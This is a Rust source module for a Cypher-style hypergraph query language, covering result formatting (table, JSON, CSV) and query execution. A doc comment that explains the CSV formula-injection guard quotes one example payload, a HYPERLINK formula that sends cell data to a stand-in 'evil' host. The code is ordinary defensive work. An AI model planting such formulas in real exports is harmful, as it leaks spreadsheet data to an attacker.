//! NQL: a Cypher-style query language over the property hypergraph.
//!
//! ```text
//! CREATE (a:Person {name:'Ada'}), (b:Person {name:'Bob'}), (a)-[:KNOWS {since:1843}]->(b)
//! CREATE HYPEREDGE m:Meeting {topic:'plan'} OVER (a, b)          -- undirected hyperedge
//! CREATE HYPEREDGE :Reaction {rate:0.5} FROM (a, b) TO (c)       -- directed hyperedge
//! MATCH (a:Person)-[:KNOWS*1..3]->(b) WHERE b.name STARTS WITH 'B' RETURN a.name, count(*) AS n ORDER BY n DESC LIMIT 10
//! MATCH HYPEREDGE h:Meeting WHERE size(members(h)) > 2 RETURN h, members(h)
//! AS OF 3 MATCH (n) RETURN count(*)                              -- time travel
//! CALL spectral.cluster(3) YIELD node, cluster RETURN cluster, count(*)
//! ```

mod exec;
pub mod parser;

use crate::db::Database;
use crate::error::{Error, Result};
use crate::value::Value;
use std::collections::HashMap;

pub type Params = HashMap<String, Value>;

#[derive(Clone, Debug, Default, PartialEq)]
pub struct Stats {
    pub nodes_created: usize,
    pub edges_created: usize,
    pub props_set: usize,
    pub deleted: usize,
    pub indexes_created: usize,
}

#[derive(Clone, Debug, Default)]
pub struct QueryResult {
    pub columns: Vec<String>,
    pub rows: Vec<Vec<Value>>,
    pub stats: Stats,
    /// Snapshot (reads) or commit (writes) timestamp.
    pub ts: u64,
}

impl QueryResult {
    /// Render as a fixed-width text table.
    pub fn to_table(&self) -> String {
        if self.columns.is_empty() {
            return String::new();
        }
        let cells: Vec<Vec<String>> = self.rows.iter().map(|r| r.iter().map(|v| v.to_string()).collect()).collect();
        let mut w: Vec<usize> = self.columns.iter().map(|c| c.chars().count()).collect();
        for r in &cells {
            for (i, c) in r.iter().enumerate() {
                w[i] = w[i].max(c.chars().count());
            }
        }
        let line = |r: &[String]| r.iter().enumerate().map(|(i, c)| format!("{:<w$}", c, w = w[i])).collect::<Vec<_>>().join(" | ");
        let mut s = line(&self.columns);
        s.push('\n');
        s.push_str(&w.iter().map(|n| "-".repeat(*n)).collect::<Vec<_>>().join("-+-"));
        for r in &cells {
            s.push('\n');
            s.push_str(&line(r));
        }
        s
    }
}

fn json_str(s: &str, out: &mut String) {
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
}

fn json_value(v: &Value, out: &mut String) {
    match v {
        Value::Null => out.push_str("null"),
        Value::Bool(b) => out.push_str(if *b { "true" } else { "false" }),
        Value::Int(i) => out.push_str(&i.to_string()),
        Value::Float(x) if x.is_finite() => out.push_str(&format!("{x:?}")),
        Value::Float(_) => out.push_str("null"),
        Value::Str(s) => json_str(s, out),
        Value::List(l) => {
            out.push('[');
            for (i, x) in l.iter().enumerate() {
                if i > 0 {
                    out.push(',');
                }
                json_value(x, out);
            }
            out.push(']');
        }
        Value::Vector(v) => json_value(&Value::List(v.iter().map(|x| Value::Float(*x as f64)).collect()), out),
        Value::Node(id) => out.push_str(&format!("{{\"node\":{id}}}")),
        Value::Edge(id) => out.push_str(&format!("{{\"edge\":{id}}}")),
    }
}

impl QueryResult {
    /// RFC 4180 CSV with a header row, safe to open in a spreadsheet. Null is an empty cell, node/edge
    /// references are their numeric ids and lists/vectors are JSON text. A *text* cell that starts with
    /// `=`, `+`, `-`, `@`, a tab or a carriage return is prefixed with `'` so Excel / Sheets / LibreOffice
    /// read it as text instead of running it as a formula (CSV injection: a stored value such as
    /// `=HYPERLINK("http://evil/?"&A1)` would otherwise execute on whoever opens the export). Numbers are
    /// never altered. Use [`QueryResult::to_csv_raw`] for byte-exact text when no spreadsheet is involved.
    pub fn to_csv(&self) -> String {
        self.csv(true)
    }

    /// Like [`QueryResult::to_csv`] but text cells are written exactly as stored (no formula guard).
    pub fn to_csv_raw(&self) -> String {
        self.csv(false)
    }

    fn csv(&self, guard: bool) -> String {
        fn guarded(s: &str) -> String {
            match s.chars().next() {
                Some('=' | '+' | '-' | '@' | '\t' | '\r') => format!("'{s}"),
                _ => s.to_string(),
            }
        }
        fn cell(s: &str, out: &mut String) {
            if s.contains([',', '"', '\n', '\r']) {
                out.push('"');
                out.push_str(&s.replace('"', "\"\""));
                out.push('"');
            } else {
                out.push_str(s);
            }
        }
        let mut out = String::new();
        let line = |cells: Vec<String>, out: &mut String| {
            for (i, c) in cells.iter().enumerate() {
                if i > 0 {
                    out.push(',');
                }
                cell(c, out);
            }
            out.push_str("\r\n");
        };
        line(self.columns.iter().map(|c| if guard { guarded(c) } else { c.clone() }).collect(), &mut out);
        for r in &self.rows {
            let cells = r
                .iter()
                .map(|v| match v {
                    Value::Null => String::new(),
                    Value::Str(s) => if guard { guarded(s) } else { s.clone() },
                    Value::Node(i) | Value::Edge(i) => i.to_string(),
                    Value::List(_) | Value::Vector(_) => {
                        let mut j = String::new();
                        json_value(v, &mut j);
                        j
                    }
                    o => o.to_string(),
                })
                .collect();
            line(cells, &mut out);
        }
        out
    }

    /// A JSON array of row objects keyed by column name (non-finite floats become null; node and
    /// edge references become `{"node":id}` / `{"edge":id}`).
    pub fn to_json(&self) -> String {
        let mut out = String::from("[");
        for (ri, r) in self.rows.iter().enumerate() {
            if ri > 0 {
                out.push(',');
            }
            out.push('{');
            for (i, (c, v)) in self.columns.iter().zip(r).enumerate() {
                if i > 0 {
                    out.push(',');
                }
                json_str(c, &mut out);
                out.push(':');
                json_value(v, &mut out);
            }
            out.push('}');
        }
        out.push(']');
        out
    }
}

pub fn run(db: &Database, text: &str, params: &Params) -> Result<QueryResult> {
    let st = parser::parse(text)?;
    if !st.has_writes() {
        let f = |view: &crate::store::View| exec::exec(view, &st, params, None);
        let mut r = match st.as_of {
            Some(ts) => db.read_at(ts, f)??,
            None => db.read(f)?,
        };
        r.ts = st.as_of.unwrap_or_else(|| db.last_ts());
        return Ok(r);
    }
    if st.as_of.is_some() {
        return Err(Error::Query("AS OF queries are read-only".into()));
    }
    let mut txn = db.begin();
    let res = db.read(|view| exec::exec(view, &st, params, Some(&mut txn)));
    match res {
        Ok(mut r) => {
            r.ts = txn.commit()?;
            Ok(r)
        }
        Err(e) => {
            txn.rollback();
            Err(e)
        }
    }
}
